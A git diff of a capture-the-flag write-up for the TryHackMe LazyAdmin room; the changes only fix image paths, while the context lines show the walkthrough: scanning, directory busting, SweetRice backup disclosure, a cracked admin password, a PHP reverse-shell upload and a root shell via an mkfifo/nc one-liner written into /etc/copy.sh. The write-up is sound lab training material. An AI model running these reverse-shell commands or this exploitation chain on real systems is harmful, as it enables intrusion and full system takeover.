@@ -49,7 +49,7 @@ I began by performing a full port scan to identify open services:
 nmap -p- -T4 -A 10.10.95.27
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-02.png">
+<img src="/assets/images/thm/ctf/lazyadmin-02.png">
 
 The results revealed two open ports:
 - **Port 22:** SSH  
@@ -57,7 +57,7 @@ The results revealed two open ports:
 
 Navigating to `http://10.10.95.27` on port 80 returned the default Apache2 Ubuntu page:
 
-<img src="assets/images/thm/ctf/lazyadmin-03.png" alt="Default Apache2 Ubuntu Page" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-03.png" alt="Default Apache2 Ubuntu Page" style="max-width:100%; height:auto;">
 
 ---
 
@@ -66,7 +66,7 @@ Navigating to `http://10.10.95.27` on port 80 returned the default Apache2 Ubunt
 ### Checking `robots.txt`
 I checked the `robots.txt` file at `http://10.10.95.27/robots.txt`, which returned “Not Found.” However, I was able to gather the Apache version `Apache/2.4.18`, which could be useful for identifying potential exploits.
 
-<img src="assets/images/thm/ctf/lazyadmin-04.png" alt="robots.txt Not Found" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-04.png" alt="robots.txt Not Found" style="max-width:100%; height:auto;">
 
 ### Directory Busting with FFuF
 I then performed directory enumeration using **FFuF**:
@@ -77,11 +77,11 @@ ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://10.10.95.27/FUZZ'
 
 This revealed an interesting directory named `/content`.
 
-<img src="assets/images/thm/ctf/lazyadmin-05.png" alt="FFuF Results Revealing Content Directory" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-05.png" alt="FFuF Results Revealing Content Directory" style="max-width:100%; height:auto;">
 
 To validate my results, I ran another directory search using **dirsearch**:
 
-<img src="assets/images/thm/ctf/lazyadmin-06.png" alt="Dirsearch Results" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-06.png" alt="Dirsearch Results" style="max-width:100%; height:auto;">
 
 ---
 
@@ -104,7 +104,7 @@ You can also access website file backups from:
 http://localhost/SweetRice-transfer.zip
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-11.png" alt="Exploit-DB Backup Disclosure PoC" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-11.png" alt="Exploit-DB Backup Disclosure PoC" style="max-width:100%; height:auto;">
 
 ### 2. Arbitrary File Upload (Exploit-DB 40716)
 
@@ -142,7 +142,7 @@ http://10.10.95.27/content/inc/mysql_backup/
 
 This exposed a MySQL backup file which I downloaded and examined.
 
-<img src="assets/images/thm/ctf/lazyadmin-12.png" alt="Accessing MySQL Backup Directory" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-12.png" alt="Accessing MySQL Backup Directory" style="max-width:100%; height:auto;">
 
 ---
 
@@ -160,7 +160,7 @@ I used **CrackStation** to crack the hash and obtained the password:
 Password: Password123
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-14.png" alt="Cracking Password Hash with CrackStation" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-14.png" alt="Cracking Password Hash with CrackStation" style="max-width:100%; height:auto;">
 
 ---
 
@@ -172,7 +172,7 @@ With valid credentials (`manager:Password123`), I logged into the CMS via:
 http://10.10.95.27/content/as/
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-16.png" alt="SweetRice CMS Login Page" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-16.png" alt="SweetRice CMS Login Page" style="max-width:100%; height:auto;">
 
 ---
 
@@ -180,7 +180,7 @@ http://10.10.95.27/content/as/
 
 After logging in, I navigated to the **Media Center** where I had the ability to upload files.
 
-<img src="assets/images/thm/ctf/lazyadmin-19.png" alt="Media Center Upload Page" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-19.png" alt="Media Center Upload Page" style="max-width:100%; height:auto;">
 
 I prepared a **PHP reverse shell** from **PentestMonkey** and modified it with my Kali IP and port:
 
@@ -190,7 +190,7 @@ I prepared a **PHP reverse shell** from **PentestMonkey** and modified it with m
 nano shell.php5
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-20.png" alt="Modifying PHP Reverse Shell Payload" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-20.png" alt="Modifying PHP Reverse Shell Payload" style="max-width:100%; height:auto;">
 
 Started a listener on port 7777:
 
@@ -198,12 +198,12 @@ Started a listener on port 7777:
 nc -lvnp 7777
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-21.png" alt="Netcat Listener Waiting on Port 7777" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-21.png" alt="Netcat Listener Waiting on Port 7777" style="max-width:100%; height:auto;">
 
 Uploaded and triggered the payload:
 
-<img src="assets/images/thm/ctf/lazyadmin-22.png" alt="Uploading Reverse Shell to Media Center" style="max-width:100%; height:auto;">
-<img src="assets/images/thm/ctf/lazyadmin-23.png" alt="Triggering Reverse Shell Payload" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-22.png" alt="Uploading Reverse Shell to Media Center" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-23.png" alt="Triggering Reverse Shell Payload" style="max-width:100%; height:auto;">
 
 ---
 
@@ -217,7 +217,7 @@ id
 sudo -l
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-24.png" alt="Initial Enumeration as www-data" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-24.png" alt="Initial Enumeration as www-data" style="max-width:100%; height:auto;">
 
 ---
 
@@ -230,7 +230,7 @@ I discovered that I had `sudo` permissions to run `backup.pl` as `root`.
 cat /home/itguy/backup.pl
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-25.png" alt="Contents of backup.pl Script" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-25.png" alt="Contents of backup.pl Script" style="max-width:100%; height:auto;">
 
 The script referenced `/etc/copy.sh`, which contained a reverse shell.
 
@@ -238,7 +238,7 @@ The script referenced `/etc/copy.sh`, which contained a reverse shell.
 cat /etc/copy.sh
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-27.png" alt="Contents of copy.sh" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-27.png" alt="Contents of copy.sh" style="max-width:100%; height:auto;">
 
 ---
 
@@ -250,7 +250,7 @@ I overwrote `copy.sh` with a reverse shell payload:
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.95.27 5554 > /tmp/f" > /etc/copy.sh
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-28.png" alt="Overwriting copy.sh with Reverse Shell" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-28.png" alt="Overwriting copy.sh with Reverse Shell" style="max-width:100%; height:auto;">
 
 ---
 
@@ -262,11 +262,11 @@ Set up a new listener on port 5554:
 nc -lvnp 5554
 ```
 
-<img src="assets/images/thm/ctf/lazyadmin-29.png" alt="Listener for Root Shell" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-29.png" alt="Listener for Root Shell" style="max-width:100%; height:auto;">
 
 Triggered the reverse shell as `root`:
 
-<img src="assets/images/thm/ctf/lazyadmin-30.png" alt="Root Shell Obtained" style="max-width:100%; height:auto;">
+<img src="/assets/images/thm/ctf/lazyadmin-30.png" alt="Root Shell Obtained" style="max-width:100%; height:auto;">
 
 ---
 
